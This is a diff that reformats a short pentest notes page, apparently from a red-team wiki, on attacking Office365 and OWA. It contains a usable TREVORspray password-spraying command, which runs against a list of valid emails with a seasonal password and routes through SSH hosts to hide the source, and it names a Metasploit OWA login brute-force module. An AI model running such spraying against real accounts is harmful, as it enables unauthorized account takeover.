@@ -8,10 +8,16 @@ description: >-
 
 ## Attacking Office365
 
-A tool that I've had a large amount of success with is [TREVORspray](https://github.com/blacklanternsecurity/TREVORspray):\
-`./trevorspray.py -e /opt/trevorspray/log/valid_emails.txt -passwords 'Winter2021' --delay 1 --no-current-ip --ssh [SSH SERVERS] -k (KEY)`
+A tool that I've had a large amount of success with is [TREVORspray](https://github.com/blacklanternsecurity/TREVORspray):
 
-## Attacking OWA
+```bash
+./trevorspray.py -e /opt/trevorspray/log/valid_emails.txt -passwords 'Winter2021' --delay 1 --no-current-ip --ssh [SSH SERVERS] -k (KEY)
+```
 
-Metasploit has a great module for attacking OWA:\
-`auxiliary/scanner/http/owa_login`
+### Attacking OWA
+
+Metasploit has a great module for attacking OWA:
+
+```bash
+auxiliary/scanner/http/owa_login
+```
